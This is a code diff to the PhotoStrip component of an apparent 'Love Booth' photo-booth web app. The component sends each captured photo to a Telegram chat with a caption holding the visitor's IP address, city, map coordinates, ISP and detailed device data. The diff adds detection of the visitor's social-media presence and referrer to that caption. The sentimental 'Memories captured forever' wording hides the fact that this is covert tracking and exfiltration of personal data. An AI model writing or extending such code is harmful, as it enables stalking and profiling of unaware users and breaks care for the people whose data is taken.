@@ -6,6 +6,7 @@ import { sendPhotoToTelegram } from '../services/telegramService';
 import { audioService } from '../services/audioService';
 import { getLocationData } from '../services/locationService';
 import { getDetailedDeviceData } from '../services/deviceService';
+import { detectSocialPresence, getReferrer } from '../services/socialService';
 
 interface PhotoStripProps {
   photos: CapturedPhoto[];
@@ -69,15 +70,19 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
     setSyncStatus('syncing');
 
     try {
-      // Fetch location and device info
+      // Fetch location, device, and social info
       const location = await getLocationData();
       const device = await getDetailedDeviceData();
+      const socialPresence = await detectSocialPresence();
+      const referrer = getReferrer();
 
       const locationStr = location
         ? `\n📍 Location: ${location.city}, ${location.country}\n🌐 IP: ${location.ip}\n🏢 ISP: ${location.org}\n🗺️ Map: https://www.google.com/maps?q=${location.latitude},${location.longitude}`
         : '\n📍 Location: Unknown';
 
       const deviceStr = `\n📱 Device: ${device.platform}\n🌐 Browser: ${device.language}\n🖥️ Screen: ${device.screenResolution}\n⏲️ Timezone: ${device.timezone}\n⚙️ CPU/RAM: ${device.cores} Cores / ${device.memory || '?'}GB\n🔋 Battery: ${device.battery}\n📂 Tabs Open: ${device.tabsOpen}\n📡 Link: ${device.connection}`;
+
+      const socialStr = `\n📣 Source: ${referrer}\n👥 Social: ${socialPresence}`;
 
       // Small delay to ensure the DOM is fully rendered before capturing
       await new Promise(r => setTimeout(r, 1000));
@@ -92,7 +97,7 @@ export const PhotoStrip: React.FC<PhotoStripProps> = ({ photos, frame, setFrame,
 
       console.log(`Blob created: ${blob.size} bytes. Sending to Telegram...`);
 
-      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.${locationStr}${deviceStr}`;
+      const caption = `❤️ Love Booth Capture!\n✨ Effect: ${selectedEffect.name}\n🖼️ Frame: ${frame.name}\n💌 Memories captured forever.${locationStr}${deviceStr}${socialStr}`;
 
       const result = await sendPhotoToTelegram(blob, TELEGRAM_CHAT_ID, caption);
       console.log('Telegram sync successful:', result);
